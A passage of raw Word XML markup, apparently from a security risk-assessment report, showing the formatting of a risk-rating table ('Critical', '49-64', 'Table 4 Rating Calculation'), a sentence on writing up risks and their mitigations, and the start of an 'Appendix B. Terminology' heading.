              <w:t>C</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1360" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Critical</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="420" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="20" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="520" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="760" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="100"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>49-64</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="101"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2660" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="FF0000"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:tcBorders>
              <w:bottom w:val="single" w:sz="8" w:space="0" w:color="auto"/>
              <w:right w:val="single" w:sz="8" w:space="0" w:color="auto"/>
            </w:tcBorders>
            <w:shd w:val="clear" w:color="auto" w:fill="FF0000"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="36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30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidTr="006C7366">
        <w:trPr>
          <w:trHeight w:val="301"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="140" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="300" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="260" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2660" w:type="dxa"/>
            <w:gridSpan w:val="6"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:ind w:left="20"/>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00802CE3">
              <w:rPr>
                <w:rFonts w:eastAsia="Times New Roman"/>
                <w:color w:val="4F81BD"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
              <w:t>Table 4 Rating Calculation</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="400" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="440" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="120" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="34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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="340" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2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58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44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100" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="360" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="460" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="30" w:type="dxa"/>
            <w:vAlign w:val="bottom"/>
          </w:tcPr>
          <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00A81704">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="284" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="390" w:lineRule="auto"/>
        <w:ind w:left="720" w:right="2100"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>After calculating the risk rating, we start writing the report on each risk and how to mitigate it.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:spacing w:line="342" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="00802CE3">
      <w:pPr>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00A2045E" w:rsidRPr="00802CE3">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="0" w:footer="0" w:gutter="0"/>
          <w:cols w:space="720" w:equalWidth="0">
            <w:col w:w="11520"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">*Based on our analysis risks that falls under this category will be </w:t>
      </w:r>
      <w:r w:rsidR="00802CE3" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>considered as High</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00A2045E" w:rsidRPr="00802CE3">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="0" w:footer="0" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="5320" w:space="440"/>
            <w:col w:w="3600" w:space="720"/>
            <w:col w:w="1440"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00A2045E" w:rsidRPr="00802CE3" w:rsidRDefault="00A2045E" w:rsidP="006C7366">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00A2045E" w:rsidRPr="00802CE3">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="0" w:footer="0" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="3600" w:space="720"/>
            <w:col w:w="4420" w:space="620"/>
            <w:col w:w="2160"/>
          </w:cols>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="002D1253" w:rsidRPr="00802CE3" w:rsidRDefault="002D1253" w:rsidP="006C7366">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:sectPr w:rsidR="002D1253" w:rsidRPr="00802CE3">
          <w:type w:val="continuous"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="739" w:right="360" w:bottom="0" w:left="360" w:header="720" w:footer="720" w:gutter="0"/>
          <w:cols w:num="3" w:space="720" w:equalWidth="0">
            <w:col w:w="5320" w:space="440"/>
            <w:col w:w="3600" w:space="720"/>
            <w:col w:w="1439"/>
          </w:cols>
          <w:docGrid w:linePitch="240" w:charSpace="-2049"/>
        </w:sectPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009D4FEF" w:rsidRPr="00802CE3" w:rsidRDefault="006C7366" w:rsidP="00653916">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:ind w:left="720"/>
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>Appendix B</w:t>
      </w:r>
      <w:r w:rsidR="009D4FEF" w:rsidRPr="00802CE3">
        <w:rPr>
          <w:rFonts w:eastAsia="Times New Roman"/>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:lang w:eastAsia="en-IN"/>
        </w:rPr>
        <w:t>. Terminology</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B87B72" w:rsidRPr="00802CE3" w:rsidRDefault="00B87B72" w:rsidP="009D4FEF">
      <w:pPr>
        <w:suppressAutoHyphens w:val="0"/>
